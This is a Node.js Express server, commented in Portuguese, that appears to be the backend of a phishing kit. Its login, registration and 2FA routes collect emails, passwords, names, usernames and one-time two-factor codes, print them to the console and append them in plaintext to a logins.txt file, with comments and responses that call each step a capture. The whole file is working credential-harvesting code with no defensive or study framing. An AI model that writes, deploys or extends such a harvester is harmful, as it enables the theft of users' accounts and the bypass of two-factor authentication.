import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3001;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Rota para capturar os dados de login
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] Email: ${email} | Password: ${password}\n`;

  console.log('Login capturado:', logEntry);

  fs.appendFile(path.join(__dirname, 'logins.txt'), logEntry, (err) => {
    if (err) {
      console.error('Erro ao salvar no arquivo:', err);
      return res.status(500).json({ success: false, message: 'Erro ao salvar dados' });
    }
    res.json({ success: true, message: 'Login capturado com sucesso' });
  });
});

// Rota para capturar os dados de registro
app.post('/api/register', (req, res) => {
  const { email, password, fullName, username } = req.body;
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] REGISTER - Name: ${fullName} | User: ${username} | Email: ${email} | Password: ${password}\n`;

  console.log('Registro capturado:', logEntry);

  fs.appendFile(path.join(__dirname, 'logins.txt'), logEntry, (err) => {
    if (err) {
      console.error('Erro ao salvar no arquivo:', err);
      return res.status(500).json({ success: false, message: 'Erro ao salvar dados' });
    }
    res.json({ success: true, message: 'Registro capturado com sucesso' });
  });
});

// Rota para capturar o código de 2 fatores
app.post('/api/2fa', (req, res) => {
  const { email, code } = req.body;
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] 2FA CODE - Email: ${email} | Code: ${code}\n`;

  console.log('Código 2FA capturado:', logEntry);

  fs.appendFile(path.join(__dirname, 'logins.txt'), logEntry, (err) => {
    if (err) {
      console.error('Erro ao salvar no arquivo:', err);
      return res.status(500).json({ success: false, message: 'Erro ao salvar código' });
    }
    res.json({ success: true, message: 'Código 2FA capturado com sucesso' });
  });
});

app.listen(PORT, () => {
  console.log(`Servidor backend rodando em http://localhost:${PORT}`);
});
